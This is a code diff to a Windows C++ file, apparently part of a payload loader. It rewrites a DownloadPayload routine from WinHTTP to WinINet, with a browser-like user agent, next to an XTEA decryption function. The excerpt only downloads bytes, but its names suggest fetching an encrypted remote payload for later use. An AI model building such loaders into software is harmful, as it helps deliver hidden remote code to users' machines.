@@ -13,8 +13,9 @@
 // ============================================================
 
 #include <windows.h>
-#include <winhttp.h>
+#include <wininet.h>
 #include <shellapi.h>
+#pragma comment(lib, "wininet.lib")
 #include <cstdint>
 #include <cstdio>
 #include <cstdarg>
@@ -145,111 +146,38 @@ static void XteaDecryptCBC(uint8_t* data, size_t size) {
 static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
     std::vector<uint8_t> result;
 
-    // 解析 URL
-    URL_COMPONENTS urlComp = {};
-    urlComp.dwStructSize = sizeof(urlComp);
-
-    wchar_t hostName[256] = {};
-    wchar_t urlPath[1024] = {};
-    urlComp.lpszHostName = hostName;
-    urlComp.dwHostNameLength = 256;
-    urlComp.lpszUrlPath = urlPath;
-    urlComp.dwUrlPathLength = 1024;
-
-    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
+    HINTERNET hInet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
+                                    nullptr, nullptr, 0);
+    if (!hInet) {
+        LoaderDiag("  FAIL: InternetOpen err=%u\n", GetLastError());
         return result;
     }
 
-    // 确定是否使用 HTTPS
-    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
+    DWORD timeout = DOWNLOAD_TIMEOUT_MS;
+    InternetSetOptionW(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionW(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionW(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
 
-    HINTERNET hSession = WinHttpOpen(
-        L"Mozilla/5.0",
-        WINHTTP_ACCESS_TYPE_NO_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-
-    if (!hSession) {
-        LoaderDiag("  FAIL: WinHttpOpen err=%u\n", GetLastError());
+    HINTERNET hUrl = InternetOpenUrlW(hInet, url, nullptr, 0,
+                                      INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD |
+                                      INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
+    if (!hUrl) {
+        LoaderDiag("  FAIL: InternetOpenUrl err=%u\n", GetLastError());
+        InternetCloseHandle(hInet);
         return result;
     }
 
-    // v3.37: 强制 TLS 1.2 (GitHub 要求, 否则 WinHttpSendRequest 报 12030)
-    {
-        DWORD tlsFlags = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
-        if (!WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
-            &tlsFlags, sizeof(tlsFlags))) {
-            LoaderDiag("  WARN: WinHttpSetOption(TLS) failed, err=%u\n", GetLastError());
-        }
+    std::vector<uint8_t> buf(65536);
+    DWORD bytesRead = 0;
+    while (InternetReadFile(hUrl, buf.data(), 65536, &bytesRead) && bytesRead > 0) {
+        size_t oldSize = result.size();
+        result.resize(oldSize + bytesRead);
+        memcpy(result.data() + oldSize, buf.data(), bytesRead);
     }
 
-    // v3.37: 重试逻辑 (网络波动/GitHub CDN 节流)
-    const int MAX_RETRIES = 2;
-    DWORD bytesAvailable = 0;
-    for (int retry = 0; retry <= MAX_RETRIES; retry++) {
-        if (retry > 0) Sleep(1500 * retry); // 退避等待
-
-        HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
-        if (!hConnect) continue;
-
-        HINTERNET hRequest = WinHttpOpenRequest(
-            hConnect, L"GET", urlPath, nullptr,
-            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
-            isHttps ? WINHTTP_FLAG_SECURE : 0);
-
-        if (!hRequest) {
-            WinHttpCloseHandle(hConnect);
-            continue;
-        }
-
-        // 设置超时
-        WinHttpSetTimeouts(hRequest,
-            DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
-            DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);
-
-        // 发送请求
-        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
-            !WinHttpReceiveResponse(hRequest, nullptr)) {
-            DWORD lastErr = GetLastError();
-            LoaderDiag("  retry=%d: SendRequest/Receive err=%u\n", retry, lastErr);
-            WinHttpCloseHandle(hRequest);
-            WinHttpCloseHandle(hConnect);
-            continue;
-        }
-
-        // 检查 HTTP 状态码
-        DWORD statusCode = 0;
-        DWORD statusCodeSize = sizeof(statusCode);
-        if (!WinHttpQueryHeaders(hRequest,
-                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
-                WINHTTP_NO_HEADER_INDEX) || statusCode != 200) {
-            WinHttpCloseHandle(hRequest);
-            WinHttpCloseHandle(hConnect);
-            continue;
-        }
-
-        // 读取响应
-        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
-            size_t oldSize = result.size();
-            result.resize(oldSize + bytesAvailable);
-            DWORD bytesRead = 0;
-            if (!WinHttpReadData(hRequest, result.data() + oldSize,
-                                 bytesAvailable, &bytesRead)) {
-                result.clear();
-                break;
-            }
-            result.resize(oldSize + bytesRead);
-        }
-
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-
-        if (!result.empty()) break; // 成功, 退出重试循环
-    }
-
-    WinHttpCloseHandle(hSession);
-
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInet);
+    LoaderDiag("  Downloaded %zu bytes\n", result.size());
     return result;
 }
 
